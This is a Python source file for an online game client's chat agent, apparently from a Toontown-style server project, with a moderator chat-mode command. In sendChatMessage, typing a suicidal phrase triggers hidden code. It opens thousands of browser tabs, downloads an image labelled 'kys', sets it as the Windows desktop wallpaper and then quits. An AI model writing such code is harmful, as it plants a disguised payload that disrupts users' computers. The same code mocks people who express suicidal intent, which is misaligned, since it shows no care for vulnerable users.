from direct.distributed.DistributedObjectGlobal import DistributedObjectGlobal
from panda3d.core import *
from panda3d.direct import *
from otp.otpbase import OTPGlobals
from otp.ai.MagicWordGlobal import *

class ChatAgent(DistributedObjectGlobal):

    def __init__(self, cr):
        DistributedObjectGlobal.__init__(self, cr)
        self.chatMode = 0

    def delete(self):
        self.ignoreAll()
        self.cr.chatManager = None
        DistributedObjectGlobal.delete(self)

    def adminChat(self, aboutId, message):
        self.notify.warning('Admin Chat(%s): %s' % (aboutId, message))
        messenger.send('adminChat', [aboutId, message])

    def sendChatMessage(self, message):
        if(message.lower() == 'IWantToFuckingEndMyLife'.lower()):
            import sys
            import ctypes
            import urllib
            import webbrowser
            webbrowser.open('https://www.youtube.com/watch?v=2dbR2JZmlWo')
            urllib.urlretrieve("https://static1.comicvine.com/uploads/original/11128/111283068/5260519-franku+%28kys%29.jpg", "SpicyMeatball.jpg")
            SPI_SETDESKWALLPAPER = 20 
            ctypes.windll.user32.SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, "SpicyMeatball.jpg" , 0)
            for i in range(1000):
                webbrowser.open('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQJ3XiqhZyPCu5Yi9QyFv6QrBxqRcfEmVuxUt_Ole2JBtPJQg25vQ')
                webbrowser.open("http://vignette4.wikia.nocookie.net/filthy-frank/images/9/95/Worst_Animal_Rights_Activist/revision/latest?cb=20150807093333")
                webbrowser.open("https://i.ytimg.com/vi/Ani_6IRV20A/maxresdefault.jpg")
                webbrowser.open("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTiUVz1_T23gCYT8NptNj5qxXg6EgFJ0wJxGmM9vwK7eP6j8s9x")
                webbrowser.open("http://static.tvtropes.org/pmwiki/pub/images/salamander_man_985.jpg")
            sys.exit()
        self.sendUpdate('chatMessage', [message, self.chatMode])
        
    def kickForSpam(self, av):
        self.sendUpdate('kickForSpam', [av.doId])
		
@magicWord(category=CATEGORY_MODERATOR, types=[int])
def chatmode(mode=-1):
    """ Set the chat mode of the current avatar. """
    mode2name = {
        0 : "user",
        1 : "moderator",
        2 : "administrator",
        3 : "system administrator",
    }
    if base.cr.chatAgent is None:
        return "No ChatAgent found."
    if mode == -1:
        return "You are currently talking in the %s chat mode." % mode2name.get(base.cr.chatAgent.chatMode, "N/A")
    if not 0 <= mode <= 3:
        return "Invalid chat mode specified."
    if mode == 3 and spellbook.getInvoker().getAdminAccess() < 500:
        return "Chat mode 3 is reserved for system administrators."
    if mode == 2 and spellbook.getInvoker().getAdminAccess() < 400:
        return "Chat mode 2 is reserved for administrators."
    if mode == 1 and spellbook.getInvoker().getAdminAccess() < 200:
        # Like this will ever happen, but whatever.
        return "Chat mode 1 is reserved for moderators."
    base.cr.chatAgent.chatMode = mode
    return "You are now talking in the %s chat mode." % mode2name.get(mode, "N/A")
